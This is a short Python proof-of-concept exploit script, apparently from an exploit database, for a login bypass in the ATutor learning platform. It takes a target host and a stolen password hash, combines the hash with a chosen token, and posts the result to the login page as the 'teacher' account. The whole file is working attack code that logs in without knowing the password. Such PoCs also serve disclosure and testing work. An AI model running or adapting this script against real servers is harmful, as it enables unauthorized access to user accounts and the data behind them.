# Exploit Title: Login Bypass - POC
# Date: 2021-04-05
# Exploit Author: Youssef B
# Tested against: ATutor until 2017

import sys, hashlib, requests
from colorama import Fore, Style, init
init()

def gen_hash(passwd, token):
    h       = hashlib.sha1()
    p, t    = passwd.encode(), token.encode()

    h.update(p + t)
    print(f"\n{Fore.MAGENTA}Hashing result:{Style.RESET_ALL} {h.hexdigest()}\n")

    return h.hexdigest()

def hash_login():
    target = "http://%s/ATutor/login.php" % sys.argv[1]
    token = "hax"
    hashed = gen_hash(sys.argv[2], token)
    d = {
        "form_password_hidden" : hashed,
        "form_login": "teacher",
        "submit": "Login",
        "token" : token
        }

    s = requests.Session()
    r = s.post(target, data=d)
    res = r.text

    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        print(f"{Fore.GREEN}(*) Status code:{Style.RESET_ALL} {r.status_code}")
        print(f"{Fore.GREEN}(*) Headers:{Style.RESET_ALL} {r.headers}")
        return True
    return False

def main():
    if len(sys.argv) != 3:
        print("(+) usage: {sys.argv[0]} <target> <hash>")
        print("(+) eg: {sys.argv[0]} 192.168.121.103 56b11a0603c7b7b8b4f06918e1bb5378ccd481cc")
        sys.exit(-1)

    if hash_login():
        print(f"{Fore.YELLOW}\n(+) Login successful!\n{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}(-) Login failed!\n{Style.RESET_ALL}")


if __name__ == "__main__":
    main()
